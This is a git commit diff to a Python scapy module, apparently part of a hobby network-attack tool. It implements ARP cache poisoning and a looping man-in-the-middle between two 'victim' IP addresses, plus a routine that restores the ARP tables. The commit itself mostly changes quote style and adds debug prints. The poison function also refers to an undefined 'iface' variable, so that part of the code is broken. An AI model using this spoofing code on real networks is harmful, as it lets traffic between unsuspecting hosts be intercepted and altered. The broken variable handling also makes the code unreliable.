aa62ee695bbf196950c0aa000b9cc0d733d96321
Brikkel@Crush <rikvanbrakel24@gmail.com>
2023-06-07 14:06:09 +0200

    bug fix attempt mitm 1

--- functions/arp.py
+++ functions/arp.py
@@ -3,16 +3,16 @@ from scapy.all import ARP, send, conf
 from .general import get_target_mac
 from time import sleep
 
-def poison(victim_ip, spoof_ip, victim_mac="", interface=""):
+def poison(victim_ip, spoof_ip, victim_mac='', interface=''):
     '''Change mac address in arp table'''
     try:
         # Only get target mac if victim mac is not specified
-        if victim_mac == "":
+        if victim_mac == '':
             # Get victim host ip address using previously created function
             victim_mac = get_target_mac(victim_ip, interface)
             
         # Set interface to the default if not specified
-        if iface =="":
+        if iface =='':
             iface = conf.iface
 
         # Create the ARP packet, scapy will add your MAC address for hwsrc
@@ -24,14 +24,14 @@ def poison(victim_ip, spoof_ip, victim_mac="", interface=""):
         # Send the ARP packet without output
         send(packet, verbose=False)
     except:
-        print("Victim not found")
+        print('Victim not found')
 
 
-def restore_arp(victim_ip, spoof_ip, interface=""):
+def restore_arp(victim_ip, spoof_ip, interface=''):
     '''Restore mac address in arp table'''
 
     # Set interface to the default if not specified
-    if interface == "":
+    if interface == '':
         interface = conf.iface
     try:
         # Find the MAC adresses of the victim and the IP you spoofed
@@ -45,15 +45,18 @@ def restore_arp(victim_ip, spoof_ip, interface=""):
         # Send the ARP packet without output
         send(packet, count=4, verbose=False, iface=interface)
     except:
-        print("Victim not found")
+        print('Victim not found')
 
 def mitm_arp(victim_1_ip, victim_2_ip, interface):
     '''This sets up a man in the middle between the two provided victim IPs'''
     
     try:
         # Tis way we don't continuously ask for the MAC adress, which are relativily static anyway
+        print(f'finding victim mac addresses on {interface}')
         victim_1_mac = get_target_mac(victim_1_ip, interface)
+        print(f'The mac address of the first victim: {victim_1_mac}')
         victim_2_mac = get_target_mac(victim_2_ip, interface)
+        print(f'The mac address of the second victim: {victim_2_mac}')
 
         while True:
             poison(victim_1_ip, victim_2_ip, victim_1_mac, interface)
@@ -65,4 +68,4 @@ def mitm_arp(victim_1_ip, victim_2_ip, interface):
         restore_arp(victim_2_ip, victim_1_ip, interface)
         print('\nARP table restored.')
     except:
-        print("Victim not found")
+        print('Victim not found')
